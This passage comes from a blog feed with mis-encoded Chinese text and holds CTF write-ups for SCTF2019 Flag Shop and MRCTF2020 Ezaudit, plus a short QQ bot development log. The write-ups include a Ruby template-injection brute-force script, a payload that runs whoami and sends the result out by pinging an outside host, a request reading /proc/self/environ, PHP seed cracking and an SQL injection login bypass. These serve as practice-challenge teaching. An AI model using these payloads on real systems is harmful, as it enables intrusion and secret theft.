·å°±æ‹¿åˆ°äº†å½“ä¸‹çš„jwt tokenå’Œkey</p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKServer: openrestyDate: Tue, 10 Aug 2021 08:55:15 GMTContent-Type: text&#x2F;html;charset&#x3D;utf-8Content-Length: 176Connection: closeSet-Cookie: auth&#x3D;eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJmMDBmZjcwNi02ZDFhLTQzOGQtOGM0OC02ZWMyYTNkN2Y1MzIiLCJqa2wiOjc1fQ.KH-pPeCd_V98pV9VdNCGEATa3XofmPKd934pW7mDqvw; domain&#x3D;0e50b8a0-5392-476e-a5ce-cd30228e8582.node4.buuoj.cn; path&#x3D;&#x2F;; HttpOnlyX-Content-Type-Options: nosniffX-Frame-Options: SAMEORIGINX-Xss-Protection: 1; mode&#x3D;block&lt;script&gt;alert(&#39;ebe18e25bc2e1a0d8d48db9b6df08d7101eed13861254583d435edf271c197e636d5e57a74a650fc39cbeaf4a78226d8290f2407cc0471d1314a5f4ea44d1877 working successfully!&#39;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Š<a href="https://jwt.io/%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%E3%80%82">https://jwt.io/è¿›è¡Œå¤„ç†ã€‚</a></p><p>ç„¶åæŠŠkeyæ”¾è¿›å»ï¼Œä¿®æ”¹é‡‘é¢ï¼Œæ‹¿åˆ°jwt tokenã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810171616528.png"></p><p>ç„¶åå†æ‰“è¿›å»ï¼Œè¿”å›æˆåŠŸï¼Œä½†æ˜¯æ²¡çœ‹åˆ°flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810171408733.png"></p><p>ç«Ÿç„¶è—åœ¨jwté‡Œï¼Œè¿˜å¾—å†è§£ç ä¸‹ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810171329820.png"></p><h4 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h4><p>æ„é€ </p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;&lt;%&#x3D;$~%&gt;do&#x3D;&lt;%&#x3D;$~%&gt; is working<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><code>$~</code> The information about the last match in the current scope.å½“å‰èŒƒå›´æœ€åä¸€æ¬¡åŒ¹é…çš„ç»“æœ</p></blockquote><p><code>ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</code></p><p>SECRETå‚æ•°å¯æ§ï¼Œå¦‚æœåŒ¹é…åˆ°SECRETï¼Œåˆ™<code>$~</code>ä¼šåœ¨é¡µé¢ä¸­è¿”å›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://0e50b8a0-5392-476e-a5ce-cd30228e8582.node4.buuoj.cn"</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/auth"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">:</span>        now <span class="token operator">=</span> flag <span class="token operator">+</span> i        <span class="token comment">#now = i + flag</span>        res <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            url <span class="token operator">+</span> <span class="token string">"/work?name=%3c%25%3d%24%7e%25%3e&amp;do=%3c%25%3d%24%7e%25%3e%20is%20working&amp;SECRET="</span><span class="token operator">+</span>now<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">48</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            flag <span class="token operator">=</span> now            <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºä¸çŸ¥é“åˆå§‹åŒ¹é…çš„ä½ç½®ï¼Œæ¯”å¦‚SECRETä¸ºabcdefgï¼Œç„¶åä¸€å¼€å§‹åŒ¹é…åˆ°d,ç¬¬äºŒæ¬¡åŒ¹é…åˆ°de,ç¬¬ä¸‰æ¬¡def,è¿™æ ·åé¢çš„åŒ¹é…å®Œäº†ï¼Œä½†å‰é¢çš„é‚£å‡ ä¸ªè¿˜æ²¡åŒ¹é…ï¼Œæ‰€ä»¥éœ€è¦æ‰§è¡Œä¸¤æ¬¡ã€‚</p><p>ç¬¬ä¸€æ¬¡<code>now = flag + i</code> å°†åé¢çš„å­—ç¬¦ä¸²åŒ¹é…å‡ºæ¥ï¼Œ</p><p>ç¬¬äºŒæ¬¡<code>now = i + flag</code>ï¼Œflagå¡«å…¥ï¼ŒåŒ¹é…å‰é¢çš„å­—ç¬¦ä¸²ã€‚</p><h4 id="HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢"><a href="#HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢" class="headerlink" title="HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢"></a>HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢</h4><p>è¯»å–çš„æ˜¯<code>/proc/self/environ</code>ï¼Œè¿™ä¸ªå¯ç›´æ¥å¾—åˆ°flag</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;work?do&#x3D;[&quot;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6&#x2F;&#x2F;urlencode&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;%5b%22%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e%22%2c%20%22%31%22%2c%20%22%32%22%2c%20%22%33%22%2c%20%22%34%22%2c%20%22%35%22%2c%20%22%36%22%5d%20%69%73%20%77%6f%72%6b%69%6e%67&amp;name[]&#x3D;%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
            <tag> Ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[MRCTF2020]Ezaudit</title>
      <link href="/p/2269707160.html"/>
      <url>/p/2269707160.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[php_mt_seed]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezaudit/image-20210810122524614.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>éšæ‰‹ä¸€è¾“ï¼Œ<a href="http://www.zip,å¾—/">www.zipï¼Œå¾—</a> æºç æ³„æ¼</p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$Private_key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Private_key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'*************'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'************'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$getuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span> <span class="token operator">.</span> <span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span>            <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">,</span> <span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$getuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>&lt;td>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// genarate public_key</span><span class="token keyword">function</span> <span class="token function-definition function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$public_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//genarate private_key</span><span class="token keyword">function</span> <span class="token function-definition function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$private_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$Public_key</span> <span class="token operator">=</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹åé¢ç»™äº†å…¬é’¥ï¼Œè¦ç®—å‡ºç§é’¥ï¼Œè€Œæ˜¯éšæœºç§å­æ²¡æœ‰é‡ç½®ï¼Œæ‰€ä»¥å…ˆå°è¯•phpéšæœºçˆ†ç ´</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezaudit/image-20210810124035931.png"></p><p>è·‘å‡ºæ¥äº†ï¼ŒéªŒè¯ä¸€ä¸‹è¯•è¯•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">1775196155</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$public_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$private_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">private_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php5.2.17,å…¬é’¥éªŒè¯æˆåŠŸ</p><p>ç”Ÿæˆä¸‹ç§é’¥ä¸º</p><pre class="line-numbers language-none"><code class="language-none">XuNhoueCDCGc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>php5ä¹‹åçš„éšæœºç§å­æ¯æ¬¡è¿›è¡Œmt_randéƒ½ä¼šè¿›è¡Œé‡ç½®ï¼Œæ‰€ä»¥éœ€è¦é¡ºç€ç¨‹åºæ€è·¯ï¼Œè®¾ç½®å¥½åˆå§‹éšæœºç§å­ï¼Œå…ˆç”Ÿæˆå…¬é’¥ï¼Œå†ç”Ÿæˆç§é’¥ã€‚ä¸å¯ç›´æ¥ä¸Šæ¥ç”Ÿæˆç§é’¥ã€‚</p></blockquote><p>ç„¶åsqlæ³¨å…¥ä¸‹ï¼Œç»“æŸ</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;7f12c5f3-f664-43fb-9cee-48361320f1d1.node4.buuoj.cn:81&#x2F;login.phpPOST:Private_key&#x3D;XuNhoueCDCGc&amp;login&#x3D;ç™»å½•&amp;password&#x3D;&#39;or&#39;1&#39;&#x3D;&#39;1&amp;username&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQæœºå™¨äººæ’ä»¶:ç¬¬ä¸ƒå²è¯—wiki</title>
      <link href="/p/4034348205.html"/>
      <url>/p/4034348205.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ‰äº†ä¹‹å‰çš„ç»éªŒï¼Œè¿™ä¸ªå†™èµ·æ¥å°±å¾ˆå¿«äº†ã€‚</p><h2 id="å¼€å‘æ—¥å¿—"><a href="#å¼€å‘æ—¥å¿—" class="headerlink" title="å¼€å‘æ—¥å¿—"></a>å¼€å‘æ—¥å¿—</h2><h3 id="2021å¹´8æœˆ10æ—¥00-55-31"><a href="#2021å¹´8æœˆ10æ—¥00-55-31" class="headerlink" title="2021å¹´8æœˆ10æ—¥00:55:31"></a>2021å¹´8æœˆ10æ—¥00:55:31</h3><p>åŸºæœ¬å¤„ç†å®Œäº†ã€‚ä¸Šçº¿æµ‹è¯•ï¼Œæ”¶å·¥ã€‚</p><h3 id="2021å¹´8æœˆ10æ—¥00-14-28"><a href="#2021å¹´8æœˆ10æ—¥00-14-28" class="headerlink" title="2021å¹´8æœˆ10æ—¥00:14:28"></a>2021å¹´8æœˆ10æ—¥00:14:28</h3><p>ç»™æ•°æ®åº“å¼„äº†ä¸ªè§¦å‘å™¨è®°å½•æ›´æ–°æ—¶é—´ï¼Œæ–¹ä¾¿æœºå™¨äººè¯»å–å·²ç»åç»­æŸ¥çœ‹ã€‚</p><h3 id="2021å¹´8æœˆ9æ—¥23-25-50"><a href="#2021å¹´8æœˆ9æ—¥23-25-50" class="headerlink" title="2021å¹´8æœˆ9æ—¥23:25:50"></a>2021å¹´8æœˆ9æ—¥23:25:50</h3><p>åŸºæœ¬çš„äººæœºäº¤äº’é€»è¾‘æ•´å¥½äº†ï¼Œè¿˜åŠ äº†ä¸ªè‡ªåŠ¨åŒæ„å¥½å‹å’ŒåŠ ç¾¤ç”³è¯·ï¼Œæ¥ä¸‹æ¥ç»§ç»­ä¼˜åŒ–ä¸‹äº¤äº’é€»è¾‘å§ã€‚</p><h3 id="2021å¹´8æœˆ9æ—¥17-57-50"><a href="#2021å¹´8æœˆ9æ—¥17-57-50" class="headerlink" title="2021å¹´8æœˆ9æ—¥17:57:50"></a>2021å¹´8æœˆ9æ—¥17:57:50</h3><p>OKï¼Œwikiä¸Šçš„æ•°æ®éƒ½æ‰’å®Œäº†ï¼ŒbeautifulsoupçœŸå¥½ä½¿å•Šï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ”¾åˆ°æ•°æ®åº“é‡Œäº†ã€‚</p><p>è¿˜æ˜¯å…ˆå†™å…¥åˆ°excelé‡Œï¼Œæ–¹ä¾¿æ—¥åä¿®æ”¹ã€‚</p><h3 id="2021å¹´8æœˆ9æ—¥11-30-05"><a href="#2021å¹´8æœˆ9æ—¥11-30-05" class="headerlink" title="2021å¹´8æœˆ9æ—¥11:30:05"></a>2021å¹´8æœˆ9æ—¥11:30:05</h3><p>æ— è¯­ï¼Œä¸€è§‰é†’æ¥ï¼Œç”¨ç«ç‹å¤åˆ¶xpathè·¯å¾„ï¼Œå’Œchromeç»“æœä¹Ÿä¸€æ ·äº†ï¼ŒçœŸæ— è¯­ã€‚è¿˜æ˜¯è€è€å®å®ç”¨bs4å§ã€‚</p><h3 id="2021å¹´8æœˆ9æ—¥00-02-39"><a href="#2021å¹´8æœˆ9æ—¥00-02-39" class="headerlink" title="2021å¹´8æœˆ9æ—¥00:02:39"></a>2021å¹´8æœˆ9æ—¥00:02:39</h3><p>é¦–å…ˆæ˜¯æ‰’wikiæ•°æ®ï¼Œè°·æ­Œæµè§ˆå™¨ä¸è¡Œå•Šï¼Œä¼šè‡ªåŠ¨è¡¥è¶³ä»€ä¹ˆï¼Œxpathè·¯å¾„ç»™çš„ä¸å¯¹ã€‚edgeä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ¢äº†ç«ç‹ï¼Œç«Ÿç„¶å¯ä»¥äº†ï¼Œå¾ˆä¹…æ²¡ç”¨ç«ç‹äº†ï¼Œè¿™ç©æ„æ‰‹æ„Ÿè¿˜æŒºå¥½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> nonebot2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hack101]THE WEB IN DEPTH</title>
      <link href="/p/3674367581.html"/>
      <url>/p/3674367581.html</url>
      
